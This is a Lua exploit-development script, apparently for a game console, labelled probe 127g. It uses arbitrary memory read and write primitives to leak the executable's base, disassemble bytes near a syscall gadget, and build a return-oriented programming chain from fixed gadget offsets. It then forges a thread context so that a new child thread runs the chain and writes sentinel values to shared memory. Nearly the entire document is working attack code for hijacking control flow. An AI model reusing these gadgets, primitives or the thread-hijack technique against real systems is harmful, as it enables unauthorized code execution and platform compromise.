-- CRASH_CLASS: MODERATE
-- PROBE 127g: Trace bare syscall continuation + child thread ROP loop
--
-- 127f found +0x1017E2 has non-crashing continuation:
--   syscall; shl esi,0x10; or esi,ecx; jmp +0x46 → eboot+0x101831
-- If the jump target path reaches a ret, we have child-thread syscalls.
--
-- Also tests: child thread executing a ROP write loop via pop_rsp;ret.

print("=== PROBE 127g: SYSCALL PATH + ROP LOOP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
local E = N(uint64(string.format("0x%X%08X", text_hi, text_lo)))
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

-- Gadget addresses (from 127d/127e, confirmed)
local g_ret       = E + 0x42
local g_pop_rax   = E + 0x992
local g_pop_rsp   = E + 0x9A2
local g_pop_rcx   = E + 0xE64
local g_pop_rsi   = E + 0xD77D
local g_pop_rdi   = E + 0xC9DFE
local g_pop_rdx   = E + 0x3B02D7
local g_mov_w     = E + 0x92C67   -- mov [rdi], rax; ret
local g_jmp_self  = E + 0x15481   -- jmp $ (infinite loop, EB FE)

-- [A] Trace bare syscall path at +0x1017E2
print("")
print("[A] Tracing syscall path +0x1017E2")
print("  After 0F 05: C1 E6 10 (shl esi,16) 09 CE (or esi,ecx) EB 46 (jmp +0x46)")
print("  Jump target: +0x1017E2 + 2 + 3 + 2 + 2 + 0x46 = +0x101831")

-- Actually: jmp short is relative to NEXT instruction
-- EB 46 is at +0x1017E9 (0x1017E2 + 2 + 3 + 2)
-- Next instruction after EB 46 is at +0x1017EB
-- Target = +0x1017EB + 0x46 = +0x101831
local jump_target = 0x101831
print(string.format("  Corrected target: +0x%X", jump_target))

-- Read 256 bytes from jump target
local jt_addr = uint64(string.format("0x%X%08X", text_hi, text_lo + jump_target))
local jt_ok, jt_data = pcall(function() return memory.read_buffer(jt_addr, 256) end)
if jt_ok and type(jt_data) == "string" then
    print(string.format("  Read %d bytes from +0x%X:", #jt_data, jump_target))

    -- Hex dump first 128 bytes in rows of 16
    for row = 0, 124, 16 do
        local line = string.format("  +%02X: ", row)
        for col = 0, 15 do
            local idx = row + col + 1
            if idx <= #jt_data then
                line = line .. string.format("%02X ", string.byte(jt_data, idx))
            end
        end
        print(line)
    end

    -- Search for ret (C3) in this stretch
    local first_ret = string.find(jt_data, string.char(0xC3), 1, true)
    if first_ret then
        print(string.format("  first C3 (ret?) at target+0x%X = eboot+0x%X",
            first_ret - 1, jump_target + first_ret - 1))
        -- Show context around the ret
        local ctx_start = math.max(1, first_ret - 4)
        local ctx_end = math.min(#jt_data, first_ret + 4)
        local ctx = ""
        for i = ctx_start, ctx_end do
            ctx = ctx .. string.format("%02X ", string.byte(jt_data, i))
        end
        print("  context: " .. ctx)
    else
        print("  NO ret in first 256 bytes after jump")
    end

    -- Search for syscall (0F 05) too
    local PAT_SC = string.char(0x0F, 0x05)
    local sc_pos = string.find(jt_data, PAT_SC, 1, true)
    if sc_pos then
        print(string.format("  syscall at target+0x%X", sc_pos - 1))
    end
else
    print("  read_buffer failed at jump target!")
end

if not alive() then print("DIED!") return end

-- [B] Child thread ROP write loop test
print("")
print("[B] Child thread ROP write loop")

-- Allocate shared page and stack
local shared = memory.alloc(0x1000)  -- shared data page
local stack = memory.alloc(0x4000)   -- child stack (16KB)
local ctx = memory.alloc(0x200)      -- ucontext (0x4C0 needed, but 0x200 alloc works)

-- Actually need 0x4C0 for full ucontext; alloc more
local ctx2 = memory.alloc(0x300)     -- extra space for ucontext tail
-- Use ctx as base (0x200 + 0x300 = 0x500 > 0x4C0)

local S = N(shared)
local STK = N(stack)
local CTX = N(ctx)

-- Zero shared page sentinel
wq(S, uint64("0x0"))
wq(S + 8, uint64("0x0"))
print(string.format("  shared=0x%X stack=0x%X ctx=0x%X", S, STK, CTX))

-- Build ROP chain at top of stack
-- Chain starts 256 bytes from top (stack grows down, chain grows up)
local chain_base = STK + 0x3000  -- leave room below for stack usage
local CB = chain_base

-- ROP chain: write 0xDEADBEEFCAFE0001 to shared, then loop
-- [0x00] pop_rdi; ret → shared addr
-- [0x08] shared addr value
-- [0x10] pop_rax; ret
-- [0x18] 0xDEADBEEFCAFE0001
-- [0x20] mov [rdi], rax; ret  → write to shared
-- [0x28] pop_rdi; ret → shared + 8
-- [0x30] shared + 8 addr
-- [0x38] pop_rax; ret
-- [0x40] 0x1111111111111111
-- [0x48] mov [rdi], rax; ret  → write second sentinel
-- [0x50] pop_rsp; ret → loop back
-- [0x58] chain_base   → RSP = chain start

wq(CB + 0x00, uint64(string.format("0x%X%08X", text_hi, text_lo + 0xC9DFE)))  -- pop rdi; ret
wq(CB + 0x08, uint64(string.format("0x%X", S)))                                -- shared addr
wq(CB + 0x10, uint64(string.format("0x%X%08X", text_hi, text_lo + 0x992)))     -- pop rax; ret
wq(CB + 0x18, uint64("0xDEADBEEFCAFE0001"))                                    -- marker value
wq(CB + 0x20, uint64(string.format("0x%X%08X", text_hi, text_lo + 0x92C67)))   -- mov [rdi],rax;ret
wq(CB + 0x28, uint64(string.format("0x%X%08X", text_hi, text_lo + 0xC9DFE)))   -- pop rdi; ret
wq(CB + 0x30, uint64(string.format("0x%X", S + 8)))                            -- shared+8
wq(CB + 0x38, uint64(string.format("0x%X%08X", text_hi, text_lo + 0x992)))     -- pop rax; ret
wq(CB + 0x40, uint64("0x1111111111111111"))                                     -- second marker
wq(CB + 0x48, uint64(string.format("0x%X%08X", text_hi, text_lo + 0x92C67)))   -- mov [rdi],rax;ret
wq(CB + 0x50, uint64(string.format("0x%X%08X", text_hi, text_lo + 0x9A2)))     -- pop rsp; ret
wq(CB + 0x58, uint64(string.format("0x%X", CB)))                               -- → back to start

-- Verify chain was written
local v0 = rq(CB + 0x00)
local v1 = rq(CB + 0x08)
print(string.format("  chain[0]=%s (expect pop_rdi %s)",
    fmt(v0), string.format("0x%X%08X", text_hi, text_lo + 0xC9DFE)))
print(string.format("  chain[1]=%s (expect shared %s)",
    fmt(v1), string.format("0x%X", S)))

-- Set up ucontext for child thread
-- Zero it first
for off = 0, 0x1FF, 4 do wd(CTX + off, 0) end
-- Can't zero ctx2 separately but it's adjacent... actually it's a separate alloc
-- Zero ctx2 too
for off = 0, 0x2FF, 4 do wd(N(ctx2) + off, 0) end

-- Actually, we need ctx to be contiguous 0x4C0 bytes. memory.alloc might not
-- give contiguous blocks. Let me use a single large alloc.
local big_ctx = memory.alloc(0x500)
local BC = N(big_ctx)
for off = 0, 0x4BF, 4 do wd(BC + off, 0) end

-- Set ucontext fields
-- RIP = ret gadget (starts ROP chain)
wd(BC + 0xE0, text_lo + 0x42)          -- RIP low = eboot + 0x42 (ret)
wd(BC + 0xE4, text_hi)                 -- RIP high

-- RSP = chain base (child starts popping from here)
wd(BC + 0xF8, CB % 0x100000000)        -- RSP low
wd(BC + 0xFC, math.floor(CB / 0x100000000))  -- RSP high

-- CS = 0x43, SS = 0x3B
wd(BC + 0xC0, 0x43)                    -- CS
wd(BC + 0x100, 0x3B)                   -- SS

-- Gates: +0x108 = 0x480, +0xD0 <= 7, +0x110 = 0x10000
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0x07)
wd(BC + 0x110, 0x10000)

-- GP registers (not critical for ROP, but set sane values)
-- RBP = stack base
wd(BC + 0x88, (STK + 0x3F00) % 0x100000000)
wd(BC + 0x8C, math.floor((STK + 0x3F00) / 0x100000000))

print("  ucontext ready at " .. string.format("0x%X", BC))

-- Verify shared is zero before child starts
local pre = rq(S)
print("  shared before: " .. fmt(pre))

if not alive() then print("DIED before thr_create!") return end

-- Create child thread
print("  creating child thread...")
local sc_thr = mk(430)
local thr_ret = nil
local tid_buf = memory.alloc(8)
wq(N(tid_buf), uint64("0x0"))

local thr_ok = pcall(function()
    thr_ret = sc_thr(big_ctx, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end)

print(string.format("  thr_create: ok=%s ret=%s", tostring(thr_ok), tostring(thr_ret)))

if not alive() then print("DIED after thr_create!") return end

-- Give child time to write (it should be nearly instant in a tight loop)
-- Read shared page multiple times
for attempt = 1, 5 do
    local v = rq(S)
    local v2 = rq(S + 8)
    print(string.format("  read #%d: shared[0]=%s shared[8]=%s", attempt, fmt(v), fmt(v2)))
    if v and N(v) ~= 0 then
        print("  *** CHILD THREAD IS WRITING! ***")
        break
    end
    -- Small delay: do a getpid syscall as a spinwait
    for i = 1, 100 do
        native.fcall_with_rax(stub, 20)
    end
end

-- Final check
local final = rq(S)
local final2 = rq(S + 8)
print("")
print(string.format("  final: shared[0]=%s shared[8]=%s", fmt(final), fmt(final2)))

local expected = uint64("0xDEADBEEFCAFE0001")
if final and fmt(final) == fmt(expected) then
    print("  *** ROP WRITE LOOP CONFIRMED ***")
else
    print("  child did not write expected value")
    if final and N(final) ~= 0 then
        print("  (but wrote SOMETHING)")
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127g COMPLETE ===")
